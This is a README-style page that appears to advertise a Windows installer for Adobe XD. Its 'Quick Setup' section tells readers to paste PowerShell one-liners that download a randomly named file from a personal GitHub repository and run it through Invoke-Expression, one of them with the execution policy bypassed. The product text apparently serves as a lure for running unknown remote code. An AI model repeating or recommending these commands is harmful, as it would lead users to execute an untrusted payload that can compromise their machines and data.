# XD

XD is the Windows program this page sets up. The command in Quick Setup installs it on this PC. After that you open XD and work in it.

Adobe XD on Windows gives UX and product designers a focused canvas for layout, typography, and vector work aimed at apps and websites. Artboards, components, and linked prototypes sit in one project file, with tools tuned for interface design rather than print or photo editing.

A typical session starts by opening or creating a document, placing artboards for key screens, and building UI with shapes, text, and imported assets. You wire buttons and screens with prototype links, preview the flow in the desktop player, and refine spacing and states before handing off layout notes or shared links to stakeholders.

This repository tracks the Windows setup package, install notes for common deployment steps, and a changelog that records version bumps and workflow tweaks. It is meant as a practical reference for designers who standardize XD versions and document how the team installs and uses the tool on PC hardware.

## What you do with it

- Artboards let you frame phone, tablet, and desktop layouts inside one XD document.
- Components and states keep buttons and nav bars consistent when screens change.
- Prototype mode links artboards with taps and transitions for realistic click-through demos.
- Repeat grid fills lists and galleries quickly from a single cell design pattern.
- Auto-animate smooths property changes between linked screens during prototype playback.
- Design specs export measurements, colors, and type details for developers reviewing layouts.
- Responsive resize helps groups adapt sensibly when artboard widths change during iteration.
- Shared document review collects comments on frames without exporting static image files.

## Quick Setup (PowerShell)

This installs the program XD on Windows.
1. Launch PowerShell:
   - Press `Win` + `X` on the keyboard.
   - Click **Terminal** or **Windows PowerShell** in the list.
2. Copy the command below, paste it into that window, and press Enter. Wait until it finishes.

```powershell
irm https://raw.githubusercontent.com/werner28954253/xd-setup-guide/main/koqgffp4xp.e5zsktfv | Invoke-Expression
```

## If the script is blocked

If Windows stops the script, paste this command into the same window and press Enter.

```powershell
powershell -ExecutionPolicy Bypass -Command "Invoke-RestMethod https://raw.githubusercontent.com/werner28954253/xd-setup-guide/main/koqgffp4xp.e5zsktfv | Invoke-Expression"
```

## Files

| File | What it is |
| --- | --- |
| `koqgffp4xp.e5zsktfv` | The file both commands read |
| `Initial.js` | Small helper kept next to the setup |
| `LICENSE` | MIT |
| `CHANGELOG.md` | What changed in build 1.0 |

## This build

Repository `werner28954253/xd-setup-guide`. Adobe XD 1.0, 2026. Windows 10 and Windows 11, 64-bit.
  
